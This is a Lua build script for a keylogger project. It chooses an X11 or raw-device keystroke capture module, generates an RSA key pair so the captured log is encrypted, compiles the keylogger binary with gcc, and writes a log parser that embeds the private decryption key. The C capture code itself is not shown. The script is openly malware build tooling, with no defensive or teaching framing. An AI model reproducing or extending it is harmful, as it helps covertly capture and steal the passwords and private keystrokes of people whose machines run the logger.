local function fileExists(name)
    local f = io.open(name, "r")
    if f ~= nil then
        io.close(f)
        return true
    else
        return false
    end
end

local function readFile(fname)
    local f = assert(io.open(fname, "rb"))
    local data = f:read('*all')
    f:close()
    return data
end

local function writeFile(fname, data)
    local f = assert(io.open(fname, "wb"))
    f:write(data)
    f:close()
end

local function quoteMultiline(text)
    text = text:gsub("\n", '\\n"\\\n"')
    return '"' .. text .. '"'
end

local MODE = os.getenv('KEYLOGGER_MODE')

if MODE ~= 'X11' and MODE ~= 'DEV' then
    print [[
Please provide the following environmental variables:

    KEYLOGGER_MODE = X11 | DEV - mode of logger

    KEYLOGGER_PRIV_KEY = path to RSA private key (PEM)
        (optional, generates new key by default)

    KEYLOGGER_LOGFILE = path to logfile
        (optional, defaults to 'log')
]]
    os.exit(1)
end

local c_files = {
    'src/crypto.c',
    'src/file_closer.c',
    'src/main.c',
}

if MODE == 'X11' then
    table.insert(c_files, 'src/xkeylogger.c')
elseif MODE == 'DEV' then
    table.insert(c_files, 'src/devkeylogger.c')
end

local PRIV_KEY = os.getenv('KEYLOGGER_PRIV_KEY')
if PRIV_KEY then
    assert(fileExists(PRIV_KEY), PRIV_KEY .. ": file not found")
end
PRIV_KEY = PRIV_KEY or 'priv.pem'

-- make RSA key
if not fileExists(PRIV_KEY) then
    os.execute(("openssl genrsa -out %s 4096"):format(PRIV_KEY))
end
os.execute(("openssl rsa -pubout -in %s -out pub.pem"):format(PRIV_KEY))

-- generate config.h
local PUBKEY = quoteMultiline(readFile('pub.pem'))
local LOGFILE = os.getenv('KEYLOGGER_LOGFILE') or 'log'
local config_h_in = readFile('src/config.h.in')
writeFile('src/config.h', config_h_in:format(MODE, PUBKEY, LOGFILE))

-- compile
local CRYPTO_LIBS = ' -lssl -lcrypto '
local X11_LIBS = ' -lX11 -lXi '
local DEV_LIBS = ' '
local LIBS = CRYPTO_LIBS
if MODE == 'X11' then
    LIBS = LIBS .. X11_LIBS
elseif MODE == 'DEV' then
    LIBS = LIBS .. DEV_LIBS
end
os.execute(("gcc %s -o src/keylogger.exe %s"):format(
    table.concat(c_files, ' '), LIBS))

-- compile crypto.so
os.execute("gcc -shared -fPIC src/crypto.c -o " ..
    "src/crypto.so " .. CRYPTO_LIBS)

-- compile file parser.lua from parser.lua.in
local PRIVKEY = readFile(PRIV_KEY)
local parser_lua_in = readFile('src/parser.lua.in')
writeFile('src/parser.lua', parser_lua_in:format(PRIVKEY, MODE))
